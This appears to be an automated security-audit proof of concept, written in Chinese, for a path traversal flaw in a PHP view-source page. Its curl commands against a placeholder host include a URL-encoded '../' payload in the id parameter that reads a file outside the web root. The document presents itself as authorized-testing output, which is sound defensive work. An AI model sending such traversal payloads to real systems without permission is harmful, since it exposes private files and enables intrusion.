# POC — view_source_all.php 通过 id 参数拼接路径读取源码文件

- finding_id: `LLM-86bd7b14c357`
- type: `path_traversal` / CWE-22
- severity: `medium`
- file: `vulnerabilities/view_source_all.php:28`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/view_source_all.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 路径穿越 / 任意文件读写 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2Ftmp%2Fsunset_LLM86bd7.txt'
```
预期：响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。